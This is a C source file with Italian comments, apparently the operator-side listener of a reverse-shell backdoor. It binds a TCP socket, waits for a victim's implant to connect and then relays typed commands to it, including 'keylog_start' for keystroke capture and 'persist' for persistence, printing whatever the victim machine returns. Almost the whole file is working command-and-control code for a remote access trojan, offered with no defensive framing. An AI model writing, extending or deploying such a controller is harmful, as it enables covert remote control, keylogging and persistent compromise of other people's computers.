#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int sock, client_socket;

    char buffer[1024];            //buffer dove mettere l
    char response[18384];
    //sockaddr_in specifica un indirizzo e porta dove trasmettere le info
    struct sockaddr_in server_address, client_address;

    int i = 0;
    int optval = 1;
    //socklen_t e' un intero usato per valori legati ai socket
    socklen_t client_length;

    //socket(famiglia, TIPO) crea un socket e ritorna un file descriptor
    sock = socket(AF_INET, SOCK_STREAM,0);

    //setsockopt() ritorna un valore, se e' 0 e' tutto a posto altrimenti c'e' un errore
    if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        printf("Error Setting TCP socket Options!\n");
        return 1;
    }

    server_address.sin_family = AF_INET;
    //inet_addr() converte una stringa a un tipo indirizzo ip
    server_address.sin_addr.s_addr = inet_addr("192.168.1.23");
    //htons() converte un int a una tipo porta
    server_address.sin_port = htons(50005);


    //bind() associa un socket a un indirizzo e una porta
    //sock e' il file descriptor dove verra' bindata la struct server_address
    bind(sock, (struct sockaddr * ) &server_address, sizeof(server_address));//bind associa un socket a un indirizo ip e a una porta
    listen(sock,5); //5 e' il num max di connessioni contemporanee
    client_length = sizeof(client_address);
    client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);
     

    //ciclo infinito in cui il server deve stare in attesa del client
    while(1){
        
        bzero(&buffer,sizeof(buffer));//stavolta bzero posso non definirla perche' e' inclusa in Linux
        bzero(&response,sizeof(response));

        printf("* Shell#%s~$: ",inet_ntoa(client_address.sin_addr));

        //prendo input da linea di comando
        fgets(buffer,sizeof(buffer), stdin);//prendo i comandi
        
        //devo eliminare il \n dai comandi che mando
        strtok(buffer,"\n");

        //invio l' input del server (la shell di comando) tramite il socket 
        write(client_socket, buffer, sizeof(buffer));//mando nella pipe i miei comandi

        //se comando 'q' termina la shell
        if(strncmp("q",buffer, 1) == 0){ //se mando q voglio chiudere il programma(esco dal loop)
            break;
        }
        else if (strncmp("cd", buffer, 3) == 0){
            continue;
        }
        else if (strncmp("keylog_start",buffer, 12) == 0){
            continue;
        }//per gli ultimi 2 comando c'e' pure una recv() da parte del socket per controllare lo stato del comando
        else if (strncmp("persist", buffer, 7) == 0){
            recv(client_socket,response, sizeof(response), 0);
            printf("%s", response);
        }
        else{//stampa cio' che mi ha inviato in risposta il client per tutti i comandi che gli ho mandato
            recv(client_socket, response, sizeof(response),MSG_WAITALL);//ricevo le info dal socket, MSG_WAITALL serve a bloccare le richieste finche' non e' finito il messaggio
            printf("%s", response);
        }

        
    }

}
